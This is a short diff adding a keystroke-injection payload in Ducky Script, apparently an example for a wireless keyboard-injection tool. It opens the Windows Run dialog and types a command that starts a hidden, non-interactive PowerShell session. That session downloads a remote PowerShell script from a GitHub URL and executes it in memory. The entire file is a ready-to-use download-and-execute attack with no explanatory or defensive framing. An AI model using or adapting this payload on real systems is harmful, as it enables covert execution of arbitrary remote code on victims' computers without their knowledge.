@@ -1,0 +1,4 @@
+GUI r
+DELAY 300
+STRING powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/insecurityofthings/jackit/master/examples/thunderstruck.ps1')"
+ENTER
